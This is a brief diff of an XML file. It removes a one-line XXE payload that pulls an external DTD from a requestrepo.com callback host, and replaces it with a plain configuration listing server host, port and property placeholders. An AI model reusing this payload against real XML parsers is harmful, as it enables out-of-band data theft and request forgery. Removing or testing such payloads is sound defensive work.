@@ -1,1 +1,13 @@
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://8adbg0yw.requestrepo.com/a.dtd"> %xxe;]>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <server>
+        <host>example.com</host>
+        <port>8080</port>
+    </server>
+    <properties>
+        <property>${app.name}</property>
+        <property>${app.version}</property>
+        <property>${database.url}</property>
+    </properties>
+</configuration>
